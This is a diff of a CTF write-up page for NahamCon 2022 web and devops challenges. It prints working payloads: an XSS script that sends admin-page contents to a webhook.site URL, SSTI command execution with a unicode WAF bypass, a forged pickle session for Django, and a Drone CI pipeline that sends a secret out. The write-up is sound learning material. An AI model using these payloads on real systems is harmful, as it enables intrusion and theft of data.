+<pre class="codehilite"><code class="language-js">y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'+btoa(x.responseText))
 </code></pre>
-    <p>
-     The character
-     <code>
-      
+<p>
+ The character
+ <code>
   +
- 
-     </code>
-     before the
-     <code>
-      
+ </code>
+ before the
+ <code>
   btoa
- 
-     </code>
-     can also be the URL encoding for a space (
-     <code>
-      
+ </code>
+ can also be the URL encoding for a space (
+ <code>
   ' '
- 
-     </code>
-     ), which was exactly what was happening and breaking my payloads syntax. URL encoding the
-     <code>
-      
+ </code>
+ ), which was exactly what was happening and breaking my payloads syntax. URL encoding the
+ <code>
   +
- 
-     </code>
-     to
-     <code>
-      
+ </code>
+ to
+ <code>
   %2B
- 
-     </code>
-     fixes the problem and the following payload works!
-    </p>
-    <pre class="codehilite"><code>&lt;script&gt;x=new XMLHttpRequest();x.onload=function(){y=new XMLHttpRequest();y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'%2Bbtoa(x.responseText));y.send()};x.open('GET','http://localhost:5000/admin');x.send();&lt;/script&gt;
+ </code>
+ fixes the problem and the following payload works!
+</p>
+<pre class="codehilite"><code>&lt;script&gt;x=new XMLHttpRequest();x.onload=function(){y=new XMLHttpRequest();y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'%2Bbtoa(x.responseText));y.send()};x.open('GET','http://localhost:5000/admin');x.send();&lt;/script&gt;
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_noice.png"/>
-    </p>
-    <p>
-     <em>
-      noice noice
-     </em>
-    </p>
-    <p>
-     Now all I needed to do was decode the base64 and grab the flag! I used
-     <a href="https://gchq.github.io/CyberChef/">
-      CyberChef
-     </a>
-     since the text was in a URL safe format and I was lazy.
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_noicenoice.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style3 alt">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Deafcon
-    </h2>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-       <th>
-        Point Value
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        flag{001a305ac5ab4b4ea995e5719ab10104}
-       </td>
-       <td>
-        45
-       </td>
-       <td>
-        491
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     Oooo noice I can finally buy get tickets for Deafcon for free! Oh wait I can't read and it isn't for Defcon...
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_page.png"/>
-    </p>
-    <p>
-     Oh well, let me just sign up with my personal email
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_noice.png"/>
+</p>
+<p>
+ <em>
+  noice noice
+ </em>
+</p>
+<p>
+ Now all I needed to do was decode the base64 and grab the flag! I used
+ <a href="https://gchq.github.io/CyberChef/">
+  CyberChef
+ </a>
+ since the text was in a URL safe format and I was lazy.
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_noicenoice.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style5 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Deafcon
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+   <th>
+    Point Value
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    flag{001a305ac5ab4b4ea995e5719ab10104}
+   </td>
+   <td>
+    45
+   </td>
+   <td>
+    491
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ Oooo noice I can finally buy get tickets for Deafcon for free! Oh wait I can't read and it isn't for Defcon...
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_page.png"/>
+</p>
+<p>
+ Oh well, let me just sign up with my personal email
+ <code>
   {{7*7}}@yeet.com
- 
-     </code>
-     (I don't know why but I had a
-     <strong>
-      Server-Side Template Injection (SSTI)
-     </strong>
-     itch when I first saw this challenge for some unknown reason).
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_yeet.png"/>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_yeeeabooi.gif"/>
-    </p>
-    <p>
-     <em>
-      heck ye
-     </em>
-    </p>
-    <p>
-     I initally thought this would be an easy challenge and I can go straight to
-     <strong>
-      Remote Code Execution
-     </strong>
-     with the following payload as an email. I got the
-     <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">
-      payload from here
-     </a>
-     .
-    </p>
-    <pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}@yeet.com
+ </code>
+ (I don't know why but I had a
+ <strong>
+  Server-Side Template Injection (SSTI)
+ </strong>
+ itch when I first saw this challenge for some unknown reason).
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_yeet.png"/>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_yeeeabooi.gif"/>
+</p>
+<p>
+ <em>
+  heck ye
+ </em>
+</p>
+<p>
+ I initally thought this would be an easy challenge and I can go straight to
+ <strong>
+  Remote Code Execution
+ </strong>
+ with the following payload as an email. I got the
+ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">
+  payload from here
+ </a>
+ .
+</p>
+<pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}@yeet.com
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_thingswentsouth.png"/>
-    </p>
-    <p>
-     <em>
-      Urgh
-     </em>
-    </p>
-    <p>
-     I felt so close to getting the flag... I could see that I can execute
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_thingswentsouth.png"/>
+</p>
+<p>
+ <em>
+  Urgh
+ </em>
+</p>
+<p>
+ I felt so close to getting the flag... I could see that I can execute
+ <code>
   popen
- 
-     </code>
-     if only I could only put in
-     <code>
-      
+ </code>
+ if only I could only put in
+ <code>
   ()
- 
-     </code>
-     without being caught by the web application filter (WAF).
-    </p>
-    <pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen}}@yeet.com
+ </code>
+ without being caught by the web application filter (WAF).
+</p>
+<pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen}}@yeet.com
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_icantastetheflag.png"/>
-    </p>
-    <p>
-     Despite my super fast progress starting this challenge, I got stumped at this point for
-     <strong>
-      hours
-     </strong>
-     . Until I decided to test what happens if I put
-     <strong>
-      special unicode characters 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
-     </strong>
-     into the email.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_oneofus.png"/>
-    </p>
-    <p>
-     As you can see above, the string
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_icantastetheflag.png"/>
+</p>
+<p>
+ Despite my super fast progress starting this challenge, I got stumped at this point for
+ <strong>
+  hours
+ </strong>
+ . Until I decided to test what happens if I put
+ <strong>
+  special unicode characters 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
+ </strong>
+ into the email.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_oneofus.png"/>
+</p>
+<p>
+ As you can see above, the string
+ <code>
   𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
- 
-     </code>
-     was
-     <strong>
-      normalised to Leonishan
-     </strong>
-     ! This means I might be able to bypass the WAF by finding alternative unicode characters for
-     <code>
-      
+ </code>
+ was
+ <strong>
+  normalised to Leonishan
+ </strong>
+ ! This means I might be able to bypass the WAF by finding alternative unicode characters for
+ <code>
   ()
- 
-     </code>
-     . This is known as an
-     <strong>
-      unicode normalisation attack
-     </strong>
-     !
-    </p>
-    <p>
-     Reading
-     <a href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">
-      this great blog
-     </a>
-     about bypassing WAFs using unicode normalization attacks, I found that I could use the characters
-     <code>
-      
+ </code>
+ . This is known as an
+ <strong>
+  unicode normalisation attack
+ </strong>
+ !
+</p>
+<p>
+ Reading
+ <a href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">
+  this great blog
+ </a>
+ about bypassing WAFs using unicode normalization attacks, I found that I could use the characters
+ <code>
   ⁽⁾
- 
-     </code>
-     and see if it bypassed the WAF.
-    </p>
-    <p>
-     Testing it with the following payload shows that I have got it!
-    </p>
-    <pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen⁽'id'⁾.read⁽⁾}}@yeet.com
+ </code>
+ and see if it bypassed the WAF.
+</p>
+<p>
+ Testing it with the following payload shows that I have got it!
+</p>
+<pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen⁽'id'⁾.read⁽⁾}}@yeet.com
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_heckye.png"/>
-    </p>
-    <p>
-     <em>
-      ye ye ye
-     </em>
-    </p>
-    <p>
-     Now I just need to find a way to execute commands with spaces since the
-     <strong>
-      WAF also blocks emails with spaces in it
-     </strong>
-     . The easiest way I used was having a seperate
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_heckye.png"/>
+</p>
+<p>
+ <em>
+  ye ye ye
+ </em>
+</p>
+<p>
+ Now I just need to find a way to execute commands with spaces since the
+ <strong>
+  WAF also blocks emails with spaces in it
+ </strong>
+ . The easiest way I used was having a seperate
+ <code>
   GET
- 
-     </code>
-     parameter called
-     <code>
-      
+ </code>
+ parameter called
+ <code>
   cmd
- 
-     </code>
-     that I could retrieve by using
-     <code>
-      
+ </code>
+ that I could retrieve by using
+ <code>
   request.args.cmd
- 
-     </code>
-     .
-    </p>
-    <p>
-     <strong>
-      Full payload
-     </strong>
-    </p>
-    <pre class="codehilite"><code>/ticket?name=yeet&amp;email={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen⁽request.args.cmd⁾.read⁽⁾}}@yeet.com&amp;cmd=cat flag.txt
+ </code>
+ .
+</p>
+<p>
+ <strong>
+  Full payload
+ </strong>
+</p>
+<pre class="codehilite"><code>/ticket?name=yeet&amp;email={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen⁽request.args.cmd⁾.read⁽⁾}}@yeet.com&amp;cmd=cat flag.txt
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_flag.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style4">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Poller
-    </h2>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-       <th>
-        Point Value
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        flag{001a305ac5ab4b4ea995e5719ab10104}
-       </td>
-       <td>
-        36
-       </td>
-       <td>
-        495
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     I am not going to lie, I tripped up a few times doing this challenge. Fortunately I had a team mate that was noticing the little details that I missed that helped me solve the challenge.
-    </p>
-    <p>
-     Poller is website specifically for the infosec community to ask and answer questions.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_page.png"/>
-    </p>
-    <p>
-     At first I thought this was going to be another SQL injection challenge, since the website crashes and responds with a
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_flag.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Poller
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+   <th>
+    Point Value
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    flag{001a305ac5ab4b4ea995e5719ab10104}
+   </td>
+   <td>
+    36
+   </td>
+   <td>
+    495
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ I am not going to lie, I tripped up a few times doing this challenge. Fortunately I had a team mate that was noticing the little details that I missed that helped me solve the challenge.
+</p>
+<p>
+ Poller is website specifically for the infosec community to ask and answer questions.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_page.png"/>
+</p>
+<p>
+ At first I thought this was going to be another SQL injection challenge, since the website crashes and responds with a
+ <code>
   500
- 
-     </code>
-     status code if you modify choice ID for a question to an invalid one.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_weird.png"/>
-    </p>
-    <p>
-     Then I noticed that the
-     <code>
-      
+ </code>
+ status code if you modify choice ID for a question to an invalid one.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_weird.png"/>
+</p>
+<p>
+ Then I noticed that the
+ <code>
   sessionid
- 
-     </code>
-     token that is assigned is a
-     <em>
-      really weird one
-     </em>
-     that I could not immediately recognise. It was at this point, one of my team mates pointed out something very important that I overlooked.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_helpfulteammate.png"/>
-    </p>
-    <p>
-     Looking at the
-     <a href="https://github.com/congon4tor/poller">
-      source code
-     </a>
-     I could immediately tell it was a
-     <strong>
-      Django
-     </strong>
-     website. I could also see why the session token is
-     <em>
-      whack
-     </em>
-     , because the site was using a
-     <strong>
-      <code>
-       
+ </code>
+ token that is assigned is a
+ <em>
+  really weird one
+ </em>
+ that I could not immediately recognise. It was at this point, one of my team mates pointed out something very important that I overlooked.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_helpfulteammate.png"/>
+</p>
+<p>
+ Looking at the
+ <a href="https://github.com/congon4tor/poller">
+  source code
+ </a>
+ I could immediately tell it was a
+ <strong>
+  Django
+ </strong>
+ website. I could also see why the session token is
+ <em>
+  whack
+ </em>
+ , because the site was using a
+ <strong>
+  <code>
    PickleSerializer
-  
-      </code>
-     </strong>
-     for some horrible reason for serializing the sessions...
-    </p>
-    <p>
-     <strong>
-      <a href="https://github.com/congon4tor/poller/blob/main/poller/poller/settings.py">
-       https://github.com/congon4tor/poller/blob/main/poller/poller/settings.py
-      </a>
-     </strong>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_ohnoes.png"/>
-    </p>
-    <p>
-     Now if you know anything about
-     <code>
-      
+  </code>
+ </strong>
+ for some horrible reason for serializing the sessions...
+</p>
+<p>
+ <strong>
+  <a href="https://github.com/congon4tor/poller/blob/main/poller/poller/settings.py">
+   https://github.com/congon4tor/poller/blob/main/poller/poller/settings.py
+  </a>
+ </strong>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_ohnoes.png"/>
+</p>
+<p>
+ Now if you know anything about
+ <code>
   pickle
- 
-     </code>
-     and mixing it with inputs that users can manipulate,
-     <strong>
-      it is a horrible idea
-     </strong>
-     ! This is because when
-     <code>
-      
+ </code>
+ and mixing it with inputs that users can manipulate,
+ <strong>
+  it is a horrible idea
+ </strong>
+ ! This is because when
+ <code>
   pickle
- 
-     </code>
-     deserializes a string, you can deseralize it to an
-     <strong>
-      arbtrary python object running custom code
-     </strong>
-     ! This means, if I can modify my session token with a
-     <strong>
-      Pickle Deserialization payload
-     </strong>
-     then I would get
-     <strong>
-      RCE
-     </strong>
-     !
-    </p>
-    <p>
-     However, in order to do this on Django I would need to know the
-     <strong>
-      <code>
-       
+ </code>
+ deserializes a string, you can deseralize it to an
+ <strong>
+  arbtrary python object running custom code
+ </strong>
+ ! This means, if I can modify my session token with a
+ <strong>
+  Pickle Deserialization payload
+ </strong>
+ then I would get
+ <strong>
+  RCE
+ </strong>
+ !
+</p>
+<p>
+ However, in order to do this on Django I would need to know the
+ <strong>
+  <code>
    SECRET_KEY
-  
-      </code>
-     </strong>
-     to forge my malicious session token. I had a
-     <em>
-      quick glimpse at the previous commits
-     </em>
-     (this would bite my butt later), then decided to see if I can find another vulnerability I could exploit on the website.
-    </p>
-    <p>
-     I saw the the Django app also had
-     <code>
-      
+  </code>
+ </strong>
+ to forge my malicious session token. I had a
+ <em>
+  quick glimpse at the previous commits
+ </em>
+ (this would bite my butt later), then decided to see if I can find another vulnerability I could exploit on the website.
+</p>
+<p>
+ I saw the the Django app also had
+ <code>
   DEBUG
- 
-     </code>
-     mode set to True, which is known for leaking sensitive information and
-     <strong>
-      should be never used in an environment exposed on the internet
-     </strong>
-     . However, I realised that this was not the method since I have made the website crash earlier and it did not show me any of the juicy information I wanted...
-    </p>
-    <p>
-     I then tried looking into other things such as decoding the session token to see if any sensitive information is leaked that way. The following code can be used to decode a Django
-     <code>
-      
+ </code>
+ mode set to True, which is known for leaking sensitive information and
+ <strong>
+  should be never used in an environment exposed on the internet
+ </strong>
+ . However, I realised that this was not the method since I have made the website crash earlier and it did not show me any of the juicy information I wanted...
+</p>
+<p>
+ I then tried looking into other things such as decoding the session token to see if any sensitive information is leaked that way. The following code can be used to decode a Django
+ <code>
   PickleSerialized
- 
-     </code>
-     token.
-    </p>
-    <p>
-     <strong>
-      <code>
-       
+ </code>
+ token.
+</p>
+<p>
+ <strong>
+  <code>
    depickler.py
-  
-      </code>
-     </strong>
-    </p>
-    <pre class="codehilite"><code class="language-python">import pickle
+  </code>
+ </strong>
+</p>
+<pre class="codehilite"><code class="language-python">import pickle
 import base64, zlib
 
 TOKEN = ".eJxNjDsKwkAURbWwFMFVaDPMNy-l2LuG8Oa9GeOHBPIpBRcw5bgOt6iiQm55zuHeF4_n7Ltb3qRlheNQV2MfuurEOc1NTusJ80iX0LzFls_YHFtBbTN0Jy8-ifjZXhxaDtf9v11NDmrs65x2qgRTKJKWoADHDoL3OloVWYEMkZCwYI4E2pQlWKektqw1OkUmQpR5FC_xSj8w:1nkMcd:K4s7fhjnjSn2ix1AIyVKOg728TpKEIO5C0Te4PBIddE"
@@ -1372,63 +1224,55 @@ if decompress:
 
 print(pickle.loads(data))
 </code></pre>
-    <p>
-     However, I did not find anything besides the standard attributes in Django tokens...
-    </p>
-    <p>
-     Fortunately, my guardian angel saved me once again and decided to have a proper look at the commits in the repository.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_lyfsaver.png"/>
-    </p>
-    <p>
-     Turns out I was a big monke for only glimpsing at the previous commits, because the new key was accidently leaked when the
-     <em>
-      developer
-     </em>
-     tried to copy the
-     <code>
-      
+<p>
+ However, I did not find anything besides the standard attributes in Django tokens...
+</p>
+<p>
+ Fortunately, my guardian angel saved me once again and decided to have a proper look at the commits in the repository.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_lyfsaver.png"/>
+</p>
+<p>
+ Turns out I was a big monke for only glimpsing at the previous commits, because the new key was accidently leaked when the
+ <em>
+  developer
+ </em>
+ tried to copy the
+ <code>
   .env
- 
-     </code>
-     file...
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_thekey.png"/>
-    </p>
-    <p>
-     Well I finally figured out what the
-     <code>
-      
+ </code>
+ file...
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_thekey.png"/>
+</p>
+<p>
+ Well I finally figured out what the
+ <code>
   SECRET_KEY
- 
-     </code>
-     so I could forge my RCE payload!
-    </p>
-    <p>
-     I based my approach from
-     <a href="https://systemoverlord.com/2014/04/14/plaidctf-2014-reekeeeee/">
-      this CTF writeup from back in 2014
-     </a>
-     , removing the
-     <code>
-      
+ </code>
+ so I could forge my RCE payload!
+</p>
+<p>
+ I based my approach from
+ <a href="https://systemoverlord.com/2014/04/14/plaidctf-2014-reekeeeee/">
+  this CTF writeup from back in 2014
+ </a>
+ , removing the
+ <code>
   python 2.*
- 
-     </code>
-     shenanigans.
-    </p>
-    <p>
-     <strong>
-      <code>
-       
+ </code>
+ shenanigans.
+</p>
+<p>
+ <strong>
+  <code>
    pickler.py
-  
-      </code>
-     </strong>
-    </p>
-    <pre class="codehilite"><code class="language-python">import os
+  </code>
+ </strong>
+</p>
+<pre class="codehilite"><code class="language-python">import os
 from django.core import signing
 from django.contrib.sessions.serializers import PickleSerializer
 import os
@@ -1447,139 +1291,123 @@ print(signing.dumps(
     )
 )
 </code></pre>
-    <p>
-     Now all I had to do was change my
-     <code>
-      
+<p>
+ Now all I had to do was change my
+ <code>
   sessionid
- 
-     </code>
-     cookie to the payload and receive the flag being sent to my webhook!
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_weebhook.png"/>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_flag.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style1 alt">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Devops
-    </h1>
-   </div>
-  </div>
- </section>
- <section class="wrapper style2">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Poisoned
-    </h2>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-       <th>
-        Point Value
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        flag{0ee4a0101bb992911c2c56e17d9b86cd}
-       </td>
-       <td>
-        82
-       </td>
-       <td>
-        468
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     For this challenge, I had access to a GiTea and Drone CI instance using the leaked credentials
-     <code>
-      
+ </code>
+ cookie to the payload and receive the flag being sent to my webhook!
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_weebhook.png"/>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poller_flag.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Devops
+</h1>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Poisoned
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+   <th>
+    Point Value
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    flag{0ee4a0101bb992911c2c56e17d9b86cd}
+   </td>
+   <td>
+    82
+   </td>
+   <td>
+    468
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ For this challenge, I had access to a GiTea and Drone CI instance using the leaked credentials
+ <code>
   developer:2!W4S5J$6e
- 
-     </code>
-     . The goal of this challenge was to find a way to leak the secret
-     <code>
-      
+ </code>
+ . The goal of this challenge was to find a way to leak the secret
+ <code>
   flag
- 
-     </code>
-     variable on the git repository
-     <code>
-      
+ </code>
+ variable on the git repository
+ <code>
   JustHacking/poisoned
- 
-     </code>
-     .
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poisoined_git.png"/>
-    </p>
-    <p>
-     Checking
-     <code>
-      
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poisoined_git.png"/>
+</p>
+<p>
+ Checking
+ <code>
   .drone.yml
- 
-     </code>
-     I can see that the flag is shown using
-     <code>
-      
+ </code>
+ I can see that the flag is shown using
+ <code>
   echo
- 
-     </code>
-     but Drone CI redacts all secret variable values from its output. However, if I could modify
-     <code>
-      
+ </code>
+ but Drone CI redacts all secret variable values from its output. However, if I could modify
+ <code>
   .drone.yml
- 
-     </code>
-     I could exfiltrate the flag by sending the flag to my webhook.
-    </p>
-    <p>
-     I realised that I could
-     <strong>
-      fork the repository
-     </strong>
-     , modify
-     <code>
-      
+ </code>
+ I could exfiltrate the flag by sending the flag to my webhook.
+</p>
+<p>
+ I realised that I could
+ <strong>
+  fork the repository
+ </strong>
+ , modify
+ <code>
   .drone.yml
- 
-     </code>
-     then
-     <strong>
-      create a pull request
-     </strong>
-     to trigger my payload and get the flag!
-    </p>
-    <p>
-     <strong>
-      <code>
-       
+ </code>
+ then
+ <strong>
+  create a pull request
+ </strong>
+ to trigger my payload and get the flag!
+</p>
+<p>
+ <strong>
+  <code>
    .drone.yml
-  
-      </code>
-     </strong>
-    </p>
-    <pre class="codehilite"><code class="language-yml">---
+  </code>
+ </strong>
+</p>
+<pre class="codehilite"><code class="language-yml">---
 kind: pipeline
 type: exec
 name: test pipeline non-master
@@ -1622,138 +1450,123 @@ trigger:
   branch:
     - master
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poisoned_pr.png"/>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/poisoned_flag.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style3 alt">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Gitops
-    </h2>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-       <th>
-        Point Value
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        flag{9e3dd10bb90e1ad16676470cabb20858}
-       </td>
-       <td>
-        31
-       </td>
-       <td>
-        496
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     Once again we have access to a GiTea and Drone CI instance with the leaked credentials
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poisoned_pr.png"/>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/poisoned_flag.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style1 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Gitops
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+   <th>
+    Point Value
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    flag{9e3dd10bb90e1ad16676470cabb20858}
+   </td>
+   <td>
+    31
+   </td>
+   <td>
+    496
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ Once again we have access to a GiTea and Drone CI instance with the leaked credentials
+ <code>
   developer:2!W4S5J$6e
- 
-     </code>
-     . However, this time the goal for the challenge is to execute code on a website that has
-     <strong>
-      continuous deployment
-     </strong>
-     setup on.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_web.png"/>
-    </p>
-    <p>
-     Since the website is running PHP, if I could just push a PHP webshell to the
-     <code>
-      
+ </code>
+ . However, this time the goal for the challenge is to execute code on a website that has
+ <strong>
+  continuous deployment
+ </strong>
+ setup on.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_web.png"/>
+</p>
+<p>
+ Since the website is running PHP, if I could just push a PHP webshell to the
+ <code>
   master
- 
-     </code>
-     branch then I could execute code on the target website.
-    </p>
-    <p>
-     However, I could not directly push to the
-     <code>
-      
+ </code>
+ branch then I could execute code on the target website.
+</p>
+<p>
+ However, I could not directly push to the
+ <code>
   master
- 
-     </code>
-     branch and the pull requests have been configured to require an alternative approver to approve the changes... damn...
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_noweebshellsad.png"/>
-    </p>
-    <p>
-     However, the repository has
-     <strong>
-      continuous integration
-     </strong>
-     setup using Drone CI. Since the Drone CI instance needs to have access to the
-     <code>
-      
+ </code>
+ branch and the pull requests have been configured to require an alternative approver to approve the changes... damn...
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/nahamcon-2022/gitops_noweebshellsad.png"/>
+</p>
+<p>
+ However, the repository has
+ <strong>
+  continuous integration
+ </strong>
+ setup using Drone CI. Since the Drone CI instance needs to have access to the
+ <code>
   git
- 
-     </code>
-     repository it
-     <strong>
-      needs to have
-      <code>
-       
+ </code>
+ repository it
+ <strong>
+  needs to have
+  <code>
    git
-  
-      </code>
-      credentials that I could steal
-     </strong>
-     ! Using those
-     <code>
-      
+  </code>
+  credentials that I could steal
+ </strong>
+ ! Using those
+ <code>
   git
- 
-     </code>
-     credentials I could self-approve the pull request and throw
-     <em>
-      software development lifecycle
-     </em>
-     practices out of the window!
-    </p>
-    <p>
-     Originally I popped a reverse shell by modifying the
-     <code>
-      
+ </code>
+ credentials I could self-approve the pull request and throw
+ <em>
+  software development lifecycle
+ </em>
+ practices out of the window!
+</p>
+<p>
+ Originally I popped a reverse shell by modifying the
+ <code>
   .drone.yml
- 
-     </code>
-     file to the one below.
-    </p>
-    <p>
-     <strong>
-      <code>
-       
+ </code>
+ file to the one below.
+</p>
+<p>
+ <strong>
+  <code>
    .drone.yml
-  
-      </code>
-     </strong>
-    </p>
-    <pre class="codehilite"><code class="language-yml">---
+  </code>
+ </strong>
+</p>
+<pre class="codehilite"><code class="language-yml">---
 kind: pipeline
 type: exec
 name: default
@@ -1767,290 +1580,246 @@ steps:
     commands:
